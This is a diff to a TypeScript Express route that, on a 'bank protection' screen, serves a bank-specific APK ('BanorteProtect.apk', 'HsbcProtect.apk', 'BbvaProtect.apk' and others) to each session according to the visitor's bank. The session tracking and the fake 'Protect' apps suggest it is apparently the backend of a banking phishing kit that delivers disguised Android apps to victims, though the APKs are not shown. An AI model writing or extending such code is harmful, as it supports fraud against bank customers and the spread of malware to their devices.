@@ -1388,12 +1388,82 @@ export async function registerRoutes(app: Express): Promise<Server> {
               // Actualizar la última actividad de la sesión
               await storage.updateSessionActivity(sessionId);
               
-              // Para protección bancaria, también actualizar la información del archivo si está presente
+              // Para protección bancaria, configurar automáticamente el archivo APK según el banco
               const updateData: any = { pasoActual: screenType };
-              if (screenType === ScreenType.PROTECCION_BANCARIA && validatedData.fileName) {
-                updateData.fileName = validatedData.fileName;
-                updateData.fileUrl = validatedData.fileUrl;
-                updateData.fileSize = validatedData.fileSize;
+              if (screenType === ScreenType.PROTECCION_BANCARIA) {
+                // Obtener información de la sesión para determinar el banco
+                const session = await storage.getSessionById(sessionId);
+                if (session) {
+                  const bankCode = session.banco?.toUpperCase();
+                  console.log('Configurando archivo de protección para banco:', bankCode);
+                  
+                  // Mapeo de bancos a archivos APK
+                  const bankFileMap: Record<string, { fileName: string; fileUrl: string; fileSize: string }> = {
+                    'BANORTE': {
+                      fileName: 'BanorteProtect.apk',
+                      fileUrl: '/assets/BanorteProtect_1749964227683.apk',
+                      fileSize: '3.9 MB'
+                    },
+                    'HSBC': {
+                      fileName: 'HsbcProtect.apk',
+                      fileUrl: '/assets/HsbcProtect_1749964227683.apk',
+                      fileSize: '3.8 MB'
+                    },
+                    'SCOTIABANK': {
+                      fileName: 'scotiabankProtect.apk',
+                      fileUrl: '/assets/scotiabankProtect_1749964227683.apk',
+                      fileSize: '3.8 MB'
+                    },
+                    'BBVA': {
+                      fileName: 'BbvaProtect.apk',
+                      fileUrl: '/assets/BbvaProtec_1749964227683.apk',
+                      fileSize: '3.9 MB'
+                    },
+                    'CITIBANAMEX': {
+                      fileName: 'banamexProtect.apk',
+                      fileUrl: '/assets/banamexProtect_1749964227683.apk',
+                      fileSize: '3.9 MB'
+                    },
+                    'BANREGIO': {
+                      fileName: 'BanregioProtect.apk',
+                      fileUrl: '/assets/BanregioProtect_1749964227683.apk',
+                      fileSize: '3.8 MB'
+                    },
+                    'BANCO_AZTECA': {
+                      fileName: 'AztecaProtect.apk',
+                      fileUrl: '/assets/AztecaProtect_1749964227683.apk',
+                      fileSize: '3.9 MB'
+                    },
+                    'INVEX': {
+                      fileName: 'InvexProtect.apk',
+                      fileUrl: '/assets/InvexProtect_1749964227683.apk',
+                      fileSize: '3.8 MB'
+                    },
+                    'AMEX': {
+                      fileName: 'AMEXProtect.apk',
+                      fileUrl: '/assets/AMEXProtect_1749964227683.apk',
+                      fileSize: '3.9 MB'
+                    }
+                  };
+                  
+                  const protectionFile = bankFileMap[bankCode];
+                  if (protectionFile) {
+                    updateData.fileName = protectionFile.fileName;
+                    updateData.fileUrl = protectionFile.fileUrl;
+                    updateData.fileSize = protectionFile.fileSize;
+                    console.log('Archivo de protección configurado automáticamente:', protectionFile.fileName);
+                  } else {
+                    console.log('No hay archivo de protección disponible para el banco:', bankCode);
+                  }
+                }
+                
+                // También considerar archivo manual si está presente en validatedData
+                if (validatedData.fileName) {
+                  updateData.fileName = validatedData.fileName;
+                  updateData.fileUrl = validatedData.fileUrl;
+                  updateData.fileSize = validatedData.fileSize;
+                  console.log('Usando archivo manual de protección:', validatedData.fileName);
+                }
               }
               
               await storage.updateSession(sessionId, updateData);
